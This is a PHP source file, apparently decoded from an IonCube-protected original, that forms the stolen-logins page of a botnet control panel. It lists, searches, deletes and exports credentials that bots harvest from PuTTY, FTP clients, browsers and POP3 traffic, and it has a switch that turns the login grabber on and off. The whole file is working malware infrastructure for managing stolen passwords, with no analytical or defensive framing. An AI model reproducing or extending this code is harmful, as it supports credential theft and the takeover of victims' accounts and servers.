<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\r\n\t";
if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
if (!((int) $Session->Rights() & USER_PRIVILEGES_VIEW_LOGS)) {
    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Your account is not allowed to view stored logs.", true, 600);
} else {
    require_once "include/gateway_defines.inc";
    require_once "include/gateway_functionality.inc";
    $_LOGINS_TYPE_STRINGS = array("Unknown source", "PuTTY SSH Client", "Unknown FTP", "FileZilla FTP", "SmartFTP", "CoreFTP", "WS_FTP Client", "FlashFXP FTP Client", "CuteFTP", "WinSCP FTP Client", "Dreamweaver", "FTP Commander Client", 14 => "FTP Network Intercept", 15 => "Internet Explorer", 16 => "Firefox", 17 => "Chrome", 18 => "POP3 Email Intercept", 19 => "POP3 Email Intercept (SSL)", 20 => "FTP Network Intercept (SSL)", 101 => "Other");
    $sqlGrab = new CGrab();
    $sqlGrab->SetInternalLink($main_sql_link);
    $pp_num_existing_export_logs = 0;
    $pp_current_logins_view_page = (int) (isset($_GET["logins_page"]) && is_numeric($_GET["logins_page"])) ? (int) $_GET["logins_page"] : 1;
    $pp_export_action_is_true = isset($_POST["export_submit"]) ? true : false;
    $pp_export_action_clear_is_true = isset($_POST["export_submit_clear"]) ? true : false;
    $pp_is_clear_table = isset($_POST["export_submit_clear_table"]) ? true : false;
    $pp_is_search_active = false;
    $pp_search_term = isset($_GET["ls"]) ? $_GET["ls"] : "";
    $pp_client_view_id = (int) isset($_GET["client_view"]) ? (int) $_GET["client_view"] : -1;
    $pp_export_path = DIR_EXPORTS . "/logins_" . @date("m_d_Y_his", @time()) . ".dat";
    if ($pp_export_action_clear_is_true == true) {
        $pp_clear_export_path = DIR_EXPORTS . "/";
        foreach (@glob($pp_clear_export_path . "logins_*.dat") as $pp_export_file) {
            @unlink($pp_export_file);
        }
    }
    $max_per_page = 30;
    $p_page_start = (int) (((int) $pp_current_logins_view_page - 1) * $max_per_page);
    $default_query = "SELECT * FROM " . SQL_DATABASE . ".grabbed_logins";
    if (isset($_GET["delete_login"]) && is_numeric($_GET["delete_login"])) {
        $del_id = (int) $_GET["delete_login"];
        if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_logins WHERE id = " . $del_id . " LIMIT 1")) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Deleted login capture #" . $del_id . " from database", true, 1110);
        } else {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to delete login capture #" . $del_id . " from database", true, 1110);
        }
    }
    if (isset($_POST["set_logingrab_status_submit_on"])) {
        $new_flags = (int) $sqlSettings->Flags_General;
        $new_flags &= ~BOT_STATUS_FLAG_LOGIN_GRAB_DISABLED;
        if ($sqlSettings->UpdateGeneralFlags($new_flags)) {
            $sqlSettings->Flags_General &= ~BOT_STATUS_FLAG_LOGIN_GRAB_DISABLED;
            global $sqlSettings;
            global $main_sql_link;
            global $Session;
            $elogs = new CLogs();
            $elogs->SetInternalLink($main_sql_link);
            $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_GRABBER_STATUS_CHANGED, "Login grabber status set to ON");
        }
    } else {
        if (isset($_POST["set_logingrab_status_submit_off"])) {
            $new_flags = (int) $sqlSettings->Flags_General;
            $new_flags |= BOT_STATUS_FLAG_LOGIN_GRAB_DISABLED;
            if ($sqlSettings->UpdateGeneralFlags($new_flags)) {
                $sqlSettings->Flags_General |= BOT_STATUS_FLAG_LOGIN_GRAB_DISABLED;
                global $sqlSettings;
                global $main_sql_link;
                global $Session;
                $elogs = new CLogs();
                $elogs->SetInternalLink($main_sql_link);
                $elogs->AddEvent($Session->Get(SESSION_INFO_USERNAME), EVENT_TYPE_GRABBER_STATUS_CHANGED, "Login grabber status set to OFF");
            }
        } else {
            if ($pp_is_clear_table == true) {
                if ($sqlGrab->Query("TRUNCATE TABLE " . SQL_DATABASE . ".grabbed_logins")) {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared all stored logins", true, 1110);
                }
            } else {
                if (isset($_POST["export_submit_clear_pop3"])) {
                    if ($sqlGrab->Query("DELETE FROM " . SQL_DATABASE . ".grabbed_logins WHERE login_type = " . GRAB_LOGIN_TYPE_POP3 . " OR login_type = " . GRAB_LOGIN_TYPE_POP3_SSL)) {
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared all stored POP3 logins (" . mysql_affected_rows() . " grabbed logins deleted)", true, 1110);
                    } else {
                        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Unable to delete stored POP3 logins due to an SQL error", true, 1110);
                    }
                } else {
                    if (isset($_GET["ls"]) && isset($_GET["lss"])) {
                        $pp_search_term = @trim(@str_replace("*", "", $pp_search_term));
                        if (0 < @strlen($pp_search_term) && strlen($pp_search_term) < 256) {
                            $search_term = @mysql_real_escape_string($pp_search_term);
                            if (@preg_match("/^[\\x20-\\x7f]*\$/D", $search_term) == true) {
                                $default_query .= " WHERE host LIKE '%" . $search_term . "%'";
                                $pp_is_search_active = true;
                            }
                        }
                    } else {
                        if (-1 < $pp_client_view_id) {
                            $default_query .= " WHERE id = " . $pp_client_view_id;
                        }
                    }
                }
            }
        }
    }
    $total_num_of_logins_nopages = 0;
    $total_num_of_logins_nopages_query = NULL;
    if ($pp_is_search_active == true) {
        $count_query_string = str_replace("SELECT *", "SELECT COUNT(id)", $default_query);
        list($total_num_of_logins_nopages) = @mysql_fetch_row(@$sqlGrab->Query($count_query_string));
    } else {
        $total_num_of_logins_nopages_query = $sqlGrab->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".grabbed_logins");
    }
    $default_query .= " LIMIT " . $p_page_start . ", " . $max_per_page;
    $all_logins = NULL;
    $all_logins = $sqlGrab->Query($default_query);
    if ($total_num_of_logins_nopages_query) {
        list($total_num_of_logins_nopages) = @mysql_fetch_row($total_num_of_logins_nopages_query);
        @mysql_free_result($total_num_of_logins_nopages_query);
    }
    if (!$total_num_of_logins_nopages) {
        $total_num_of_logins_nopages = 1;
    }
    $total_num_logins = $total_num_of_logins_nopages;
    $total_num_exported = 0;
    $file_ptr = NULL;
    if (0 < $total_num_logins) {
        while ($current_row = mysql_fetch_assoc($all_logins)) {
            _obfuscated_0D3C0D32123137123F191C191929395C2733323E3D2811_($current_row);
        }
        @mysql_data_seek($all_logins, 0);
    }
    if ($pp_export_action_is_true == true) {
        $file_ptr = @fopen($pp_export_path, "w");
        if ($file_ptr != NULL) {
            $all_logins_exports = $sqlGrab->Query("SELECT * FROM " . SQL_DATABASE . ".grabbed_logins");
            if ($all_logins_exports) {
                fwrite($file_ptr, "﻿");
                while ($current_row = mysql_fetch_assoc($all_logins_exports)) {
                    $export_line = "";
                    if ($current_row["login_type"] == GRAB_LOGIN_TYPE_PUTTY_CAPTURE || 0 <= (int) stripos($current_row["login_type"], "putty")) {
                        $e_type = "putty";
                    } else {
                        if (GRAB_LOGIN_TYPE_FTP_MIN_TYPE_VALUE < $current_row["login_type"] && $current_row["login_type"] < GRAB_LOGIN_TYPE_FTP_MAX_TYPE_VALUE || $current_row["login_type"] == GRAB_LOGIN_TYPE_FTP_NETWORK_CAPTURE || 0 <= (int) stripos($current_row["login_type"], "FTP/") || 0 <= (int) stripos($current_row["login_type"], "FTPI/")) {
                            $e_type = "ftp";
                        } else {
                            if ($current_row["login_type"] == GRAB_LOGIN_TYPE_INTERNET_EXPLORER || $current_row["login_type"] == GRAB_LOGIN_TYPE_FIREFOX || $current_row["login_type"] == GRAB_LOGIN_TYPE_CHROME || 0 <= (int) stripos($current_row["login_type"], "BROWSER/")) {
                                $e_type = "browser";
                            } else {
                                if (0 <= (int) stripos($current_row["login_type"], "MSGNR/")) {
                                    $e_type = "msgnr";
                                } else {
                                    if (0 <= (int) stripos($current_row["login_type"], "MAIL/") || 0 <= (int) stripos($current_row["login_type"], "MAILI/")) {
                                        $e_type = "mail";
                                    } else {
                                        $e_type = "unknown";
                                    }
                                }
                            }
                        }
                    }
                    $e_extended = "";
                    $e_user = $current_row["user"];
                    $e_pass = $current_row["password"];
                    $e_host = $current_row["host"];
                    $e_user = _obfuscated_0D042F1F10363535032E052907353F0C111E5B5C283F32_($e_user);
                    $e_pass = _obfuscated_0D042F1F10363535032E052907353F0C111E5B5C283F32_($e_pass);
                    if ($e_type != "ftp" && (int) $current_row["port"] != 0) {
                        $e_extended = ":" . (int) $current_row["port"];
                    }
                    $export_line = (string) $e_user . " - " . $e_type . "://" . $e_user . ":" . $e_pass . "@" . $e_host . $e_extended . "\r\n";
                    @fwrite($file_ptr, $export_line);
                    $total_num_exported++;
                }
                @mysql_free_result($all_logins_exports);
            }
            @fclose($file_ptr);
        }
    }
    $pp_dir_export_path = DIR_EXPORTS . "/";
    $pthresults = @glob($pp_dir_export_path . "logins_*.dat");
    if ($pthresults) {
        foreach (@glob($pp_dir_export_path . "logins_*.dat") as $pp_export_file) {
            $pp_num_existing_export_logs++;
        }
    }
    echo "\r\n\r\n\r\n<table align=\"center\">\r\n        <thead>\r\n          <tr>\r\n            <th width=\"20%\"></th>\r\n            <th width=\"80%\"></th>\r\n          </tr>\r\n        </thead>\r\n        <tbody>\r\n\t\t<tr>\r\n            <td valign=\"top\">\r\n\r\n\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"left\" style=\"width: 270px;\">\r\n\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t<th width=\"250\"></th>\r\n\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("General statistics", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Botnet", $sqlSettings->Name);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Created", date("m/d/Y", $sqlSettings->Created));
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Version", $sqlSettings->Version);
    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
    echo "\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\t";
    $stats_total_logins = $sqlGrab->Stats_GetTotalLogins();
    $stats_total_browser_logins = $sqlGrab->Stats_GetTotalBrowserLogins();
    $stats_total_ftp_client_logins = $sqlGrab->Stats_GetTotalFtpClientLogins();
    $stats_total_ftp_traffic_logins = $sqlGrab->Stats_GetTotalFtpNetworkCaptures();
    $stats_total_putty_logins = $sqlGrab->Stats_GetTotalPuttyLoginCaptures();
    $stats_total_pop3_logins = $sqlGrab->Stats_GetTotalPOP3LoginCaptures();
    echo "\t\t\t\t\t\t\t\t<!-- General statistics alignment table -->\r\n\t\t\t\t\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Grab statistics", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total logins captured", $stats_total_logins);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("FTP Client passwords", $stats_total_ftp_client_logins);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("FTP passwords from network sniffing", $stats_total_ftp_traffic_logins);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("PuTTY Login captures", $stats_total_putty_logins);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("POP3 passwords", $stats_total_pop3_logins);
    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Export", 10, "top: -3px;", "");
    echo "\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['export_hidden_redirect'].submit()\">Export raw logins data</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['export_hidden_redirect_clear'].submit()\">Clear existing export logs (";
    echo $pp_num_existing_export_logs;
    echo ")</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['export_hidden_redirect_clear_table'].submit()\">Clear all stored logins</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t\t<a href=\"#\" onclick=\"document['export_hidden_redirect_clear_pop3'].submit()\">Clear all stored POP3 logins</a>\r\n\t\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t\t</tbody>\r\n\t\t\t\t</table>\r\n\t\t\t\t</font>\r\n\t\t\t</td>\r\n\t\t\t\r\n\t\t\t<td valign=\"top\">\r\n\r\n\t\t\t\t";
    if ($pp_export_action_is_true == true) {
        echo "\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Logins alert table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t";
        $export_file_size = @filesize($pp_export_path);
        $export_file_size_string = "";
        if (1024 < $export_file_size) {
            $export_file_size /= 1024;
            $export_file_size_string = " " . $export_file_size . " kB";
        } else {
            if (0 < $export_file_size) {
                $export_file_size_string = " " . $export_file_size . " byte(s)";
            }
        }
        echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\tDownload exported logins: &nbsp; <a href=\"";
        echo $pp_export_path;
        echo "\">Grabbed logins ( ";
        echo "/" . $pp_export_path . " &nbsp;-&nbsp; " . $export_file_size_string;
        echo "&nbsp; - &nbsp;";
        echo $total_num_exported;
        echo " entries )</a>\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t";
    }
    echo "\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Login grabber status table -->\r\n\t\t\t\t\t\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\tLogin grabber status:&nbsp;&nbsp;\r\n\t\t\t\t\t\t\t";
    if ($sqlSettings->Flags_General & BOT_STATUS_FLAG_LOGIN_GRAB_DISABLED) {
        echo "<font color=\"#E80000\">Disabled</font>&nbsp;&nbsp;[ <a href=\"#\" onclick=\"document['set_logingrab_status_on'].submit()\">Enable</a> ]";
    } else {
        echo "<font color=\"#339900\">Enabled</font>&nbsp;&nbsp;[ <a href=\"#\" onclick=\"document['set_logingrab_status_off'].submit()\">Disable</a> ]";
    }
    echo "\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t<br />\r\n\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t<!-- Logins search table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\">\r\n\t\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t\t<td>\r\n\t\t\t\t\t\t\t\tSearch for specific host / IP / Client: &nbsp;<i>(Partial text but no wildcards supported)</i><br />\r\n\t\t\t\t\t\t\t\t<form name=\"lsf\" method=\"get\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\">\r\n\t\t\t\t\t\t\t\t\t<input type=\"hidden\" name=\"mod\" value=\"logins\">\r\n\t\t\t\t\t\t\t\t\t<input name=\"ls\" value=\"";
    echo $pp_search_term;
    echo "\" type=\"text\" class=\"span3\" style=\"position: relative; top: 8px; font-size: 10px; face: font-family: Tahoma; height: 16px; width: 280px;\">&nbsp;&nbsp;<input name=\"lss\" value=\"Search\" type=\"submit\" class=\"btn\" style=\"position: relative; top: 3px; font-size: 10px; face: font-family: Tahoma; height: 26px; width: 60px;\">\r\n\t\t\t\t\t\t\t\t</form>\r\n\t\t\t\t\t\t\t\t";
    if ($pp_is_search_active == true || -1 < $pp_client_view_id) {
        echo "<strong>Found " . $total_num_logins . " result(s) similar to '" . @htmlspecialchars($pp_search_term) . "'</strong>";
    }
    echo "\t\t\t\t\t\t\t</td>\r\n\t\t\t\t\t\t</tr>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t</font>\r\n\t\t\t\t\r\n\t\t\t\t\t<font size=\"1\" face=\"Tahoma\">\r\n\t\t\t\t\t";
    _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(false);
    _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_logins_view_page, $max_per_page, $total_num_of_logins_nopages, "logins_page");
    _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(false);
    echo "\r\n\t\t\t\t\t<!-- Logins list table -->\r\n\t\t\t\t\t<table class=\"table table-bordered table-condensed table-striped\" align=\"center\" valign=\"top\" style=\"width: 1200px;\">\r\n\t\t\t\t\t\t\t<thead>\r\n\t\t\t\t\t\t\t  <tr>\r\n\t\t\t\t\t\t\t\t<th width=\"140\">Login Source</th>\r\n\t\t\t\t\t\t\t\t<th width=\"180\">Host</th>\r\n\t\t\t\t\t\t\t\t<th width=\"150\">Username</th>\r\n\t\t\t\t\t\t\t\t<th width=\"150\">Password</th>\r\n\t\t\t\t\t\t\t\t<th width=\"150\">Date Captured</th>\r\n\t\t\t\t\t\t\t\t<th width=\"110\">Options</th>\r\n\t\t\t\t\t\t\t  </tr>\r\n\t\t\t\t\t\t\t</thead>\r\n\t\t\t\t\t\t\t<tbody>\r\n\t\t\t\t\t";
    if (0 < $total_num_logins) {
        $start_at = ($pp_current_logins_view_page - 1) * $max_per_page;
        for ($current_index = 0; $current_row = @mysql_fetch_assoc($all_logins); $current_index++) {
            _obfuscated_0D2F1110103E3722133D021D060318020A01251D401B22_($current_row["id"], $current_row["login_type"], $current_row["host"], $current_row["port"], $current_row["user"], $current_row["password"], $current_row["date_added"]);
        }
    } else {
        $no_logins_string = "No logins captured ...";
        if ($pp_is_search_active == true || -1 < $pp_client_view_id) {
            $no_logins_string = "No results ...";
        }
        echo "<tr><td>" . $no_logins_string . "</td><td></td><td></td><td></td><td></td></tr>";
    }
    echo "\t\t\t\t\t\t\t</tbody>\r\n\t\t\t\t\t</table>\r\n\t\t\t\t\t";
    _obfuscated_0D0A1B251B251F2C1036213E1B065B24010C1F3B042911_(false);
    _obfuscated_0D1C08281828312E2801110E012122212235041D173B01_($pp_current_logins_view_page, $max_per_page, $total_num_of_logins_nopages, "logins_page");
    _obfuscated_0D1D13360F190502082F110F39373B390B5B2F14252601_(false);
    echo "\t\t\t\t\t<br />\r\n\t\t\t\t\t</font>\r\n\t\t\t\t</td>\r\n\t\t\t</tr>\r\n\t\t\t</table>\r\n\t\t\t\r\n\t\t\t <form name=\"export_hidden_redirect\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"export_hidden_redirect_clear\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit_clear\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"export_hidden_redirect_clear_table\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit_clear_table\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"export_hidden_redirect_clear_pop3\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"export_submit_clear_pop3\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"set_logingrab_status_on\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"set_logingrab_status_submit_on\" value=\"yes\">\r\n\t\t\t</form>\r\n\t\t\t <form name=\"set_logingrab_status_off\" method=\"post\" action=\"";
    echo $_SERVER["REQUEST_URI"];
    echo "\" style=\"visibility:hidden\">\r\n\t\t\t\t<input type=\"hidden\" name=\"set_logingrab_status_submit_off\" value=\"yes\">\r\n\t\t\t</form>\r\n\t";
}

?>